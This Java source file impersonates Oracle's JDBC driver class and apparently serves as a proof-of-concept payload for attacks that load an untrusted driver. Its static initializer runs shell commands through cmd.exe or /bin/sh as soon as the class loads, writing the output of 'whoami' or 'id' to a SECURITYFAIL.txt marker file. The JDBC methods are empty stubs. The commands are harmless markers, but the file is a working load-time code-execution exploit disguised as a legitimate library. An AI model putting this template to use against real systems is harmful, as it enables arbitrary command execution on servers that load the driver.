package oracle.jdbc;

import java.sql.*;
import java.util.*;
import java.util.logging.*;

public class OracleDriver implements java.sql.Driver {

    protected static boolean DEBUG = false;
    public static final String VERSION = "1.0";

    private static final String CMD_WINDOWS = "whoami > c:\\SECURITYFAIL.txt";
    private static final String CMD_LINUX = "/usr/bin/id > /tmp/SECURITYFAIL.txt";

    static{
        // we don't actually need to register the driver, can use this statis block for execution
        // OracleDriver driverInst = new OracleDriver();
        // DriverManager.registerDriver(driverInst);

        if(DEBUG){
            Logger.getGlobal().info("Entered static JDBC driver initialization block, executing the payload...");
        }

        _run();
    }

    private static void _run(){
        String shell, shell_opt, cmd;

        if( System.getProperty("os.name").toLowerCase().contains("windows") ){
            // Windows
            if(DEBUG){
                Logger.getGlobal().info("Using Windows OS cmd");
            }
            // shell is needed to enable output redirects
            shell = "cmd.exe";
            shell_opt = "/c";
			cmd = CMD_WINDOWS;
        } else {
            // Linux
            if(DEBUG){
                Logger.getGlobal().info("Using Linux OS cmd");
            }
            // shell is needed to enable output redirects
            shell = "/bin/sh";
            shell_opt = "-c";
            cmd = CMD_LINUX;
        }

        try{
            if(DEBUG){
                Logger.getGlobal().info("Executing "+shell+" "+shell_opt+" "+cmd);
            }
            Process p = Runtime.getRuntime().exec(new String[] {shell, shell_opt, cmd});
        } catch(Exception e) {
            if(DEBUG){
                Logger.getGlobal().severe("Unable to execute the payload: "+e.getMessage());
            }
        }
    }

    // JDBC methods below

    public boolean acceptsURL(String url){
        if(DEBUG){
            Logger.getGlobal().info("acceptsURL() called: "+url);
        }

        return false;
    }

    public Connection connect(String url, Properties info){
        if(DEBUG){
            Logger.getGlobal().info("connect() called: "+url);
        }

        return null;
    }


    public int getMajorVersion(){
        if(DEBUG){
            Logger.getGlobal().info("getMajorVersion() called");
        }

        return 1;
    }

    public int getMinorVersion(){
        if(DEBUG){
            Logger.getGlobal().info("getMajorVersion() called");
        }

        return 0;
    }

    public Logger getParentLogger(){
        if(DEBUG){
            Logger.getGlobal().info("getParentLogger() called");
        }

        return null;
    }

    public DriverPropertyInfo[] getPropertyInfo(String url, Properties info){
        if(DEBUG){
            Logger.getGlobal().info("getPropertyInfo() called: "+url);
        }

        return new DriverPropertyInfo[0];
    }

    public boolean jdbcCompliant(){
        if(DEBUG){
            Logger.getGlobal().info("jdbcCompliant() called");
        }

        return true;
    }
}